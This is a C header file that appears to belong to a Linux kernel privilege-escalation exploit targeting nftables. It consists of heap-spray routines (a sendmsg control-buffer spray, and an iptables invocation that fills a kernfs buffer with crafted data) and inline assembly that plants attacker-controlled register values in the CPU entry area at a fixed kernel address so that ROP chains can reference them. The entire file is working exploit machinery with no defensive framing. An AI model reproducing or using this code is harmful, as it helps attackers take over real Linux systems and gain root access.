#ifndef PWN_SPRAY_H
#define PWN_SPRAY_H

#define MSG_SIZE 0x2010
char spray_buf[MSG_SIZE];

void spray_sendmsg() {
    char *buf = spray_buf;
    struct msghdr msg = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    // rop_chain((uint64_t*) buf);

    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6666);

    msg.msg_control = buf;
    msg.msg_controllen = MSG_SIZE;
    msg.msg_name = (caddr_t)&addr;
    msg.msg_namelen = sizeof(addr);

    // set_affinity(0);

    sendmsg(sockfd, &msg, 0);
}

// Fake qdisc data
uint8_t kernfs_data[4096] = { 0 };

// Send controlled data to deducible address in kernel from kernel base
void fill_kernfs_buf(void) {
    // Create a lockfile that we can actually use
    setenv("XTABLES_LOCKFILE", "/tmp/xtables.lock", 1);

    // Redirect stdout and stderr to /dev/null
    int devnull = open("/dev/null", O_WRONLY);
    if (devnull < 0) {
        exit(-1);
    }
    dup2(devnull, STDOUT_FILENO);
    dup2(devnull, STDERR_FILENO);
    close(devnull);

    // Execute iptables to fill buffer
    execl("./xtables-legacy-multi", "iptables", "-A", "OUTPUT", "-m", "cgroup", "--path",
        kernfs_data, "-j", "LOG", (char *)NULL);
}

// Check for NULL byte in u64
int has_null(uint64_t val) {
    for (int i = 0; i < 8; i++) {
        if (((val >> (i * 8)) & 0xFF) == 0) {
            return 1;
        }
    }
    return 0;
}

size_t validate_kernfs_val(size_t val) {
    if (has_null(val)) {
        fatal("val has null!");
    }
    return val;
}

// Send kernfs data to the kernel
void send_kernfs_data(void) {
    int pid = fork();
    if (pid < 0) {
        perror("fork");
        exit(-1);
    }

    // Child
    if (pid == 0) {
        fill_kernfs_buf(); // Doesn't return
    }

    // Parent, wait for child to finish
    int status;
    waitpid(pid, &status, 0);
}


// CPU entry area pointers. We prepare some memory here that will be referenced
// by the ROP chains.
// We need:
//  - the struct nft_expr_ops { .eval } member
#define CPU_ENTRY_AREA_BASE(cpu) (0xfffffe0000001000ull + (uint64_t)cpu * 0x3b000)
#define PAYLOAD_LOCATION(cpu) (CPU_ENTRY_AREA_BASE(cpu) + 0x1f58)

struct cpu_entry_area_payload {
    uint64_t regs[16];
};

static void sig_handler(int) {
}

static __attribute__((noreturn)) void write_cpu_entry_area(void* payload) {
  asm volatile (
	  "mov %0, %%rsp\n"
	  "pop %%r15\n"
	  "pop %%r14\n"
	  "pop %%r13\n"
	  "pop %%r12\n"
	  "pop %%rbp\n"
	  "pop %%rbx\n"
	  "pop %%r11\n"
	  "pop %%r10\n"
	  "pop %%r9\n"
	  "pop %%r8\n"
	  "pop %%rax\n"
	  "pop %%rcx\n"
	  "pop %%rdx\n"
	  "pop %%rsi\n"
	  "pop %%rdi\n"
	  "divq (0x1234000)\n"
    "1:\n"
    "jmp 1b\n"
    : : "r"(payload)
  );
  __builtin_unreachable();
}

// Fill the CPU entry area exception stack of HELPER_CPU with a
// struct cpu_entry_area_payload
void setup_cpu_entry_area(struct cpu_entry_area_payload payload) {
  if (fork()) {
    return;
  }

//   struct cpu_entry_area_payload payload = {};
//   payload.nft_expr_eval = kbase + PUSH_RBX_POP_RSP;

  set_cpu(1);
  signal(SIGFPE, sig_handler);
  signal(SIGTRAP, sig_handler);
  signal(SIGSEGV, sig_handler);
  setsid();

  write_cpu_entry_area(&payload);
}

#endif